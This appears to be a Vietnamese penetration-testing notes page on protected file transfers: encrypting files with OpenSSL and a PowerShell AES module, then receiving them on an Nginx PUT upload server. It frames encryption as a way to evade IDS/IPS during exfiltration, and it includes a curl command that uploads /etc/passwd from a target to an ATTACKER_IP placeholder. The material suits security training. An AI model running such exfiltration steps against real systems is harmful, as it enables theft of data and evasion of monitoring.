---
title: "Protected File Transfers"
date: 2026-04-16 00:06:00 +0700
categories: [Pentest, File Transfer]
tags: [file-transfer, encryption, openssl, aes, nginx, https, opsec]
---

> Khi exfiltrate dữ liệu nhạy cảm, cần **mã hóa file trước khi truyền** để tránh bị phát hiện bởi IDS/IPS và tránh lộ dữ liệu nếu traffic bị intercept.
{: .prompt-info}

---

## Linux — OpenSSL

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out <file>.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file>.enc -out <file>
```

| Flag | Ý nghĩa |
|---|---|
| `-aes256` | AES-256-CBC |
| `-iter 100000` | Tăng vòng lặp KDF → chống brute-force |
| `-pbkdf2` | Dùng PBKDF2 thay MD5 mặc định |

---

## Windows — Invoke-AESEncryption.ps1

```powershell
# Import module
Import-Module .\Invoke-AESEncryption.ps1

# Encrypt file → tạo ra <file>.aes
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

# Decrypt
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

> **Best Practice:**
> - Dùng password khác nhau cho từng client/engagement
> - Ưu tiên kênh truyền đã mã hóa sẵn: SSH, SFTP, HTTPS
> - Mã hóa file là fallback khi không có kênh an toàn
{: .prompt-tip}

---

## HTTP/S — Nginx Upload Server (PUT Method)

### Tại sao dùng Nginx thay Apache?

Apache dễ bị lợi dụng execute webshell (PHP module). Nginx không execute PHP theo mặc định → an toàn hơn khi setup upload server.

### Setup

```bash
# 1. Tạo thư mục nhận file
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# 2. Đổi owner
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# 3. Tạo config
sudo nano /etc/nginx/sites-available/upload.conf
```

```nginx
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
# 4. Enable + restart
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default   # nếu port 80 conflict
sudo systemctl restart nginx.service

# Debug
tail -2 /var/log/nginx/error.log
```

### Upload file (từ target)

```bash
curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt

# Verify
tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

> Nginx không bật directory listing theo mặc định → file upload không bị lộ qua browser (khác Apache).
{: .prompt-warning}

---

## Tổng hợp chiến lược

| Tình huống | Phương pháp |
|---|---|
| Linux exfil, cần mã hóa | `openssl enc -aes256` |
| Windows exfil, cần mã hóa | `Invoke-AESEncryption.ps1` |
| Nhận file từ nhiều target | Nginx PUT server |
| Cần stealth + encrypted channel | SSH/SCP, HTTPS uploadserver |
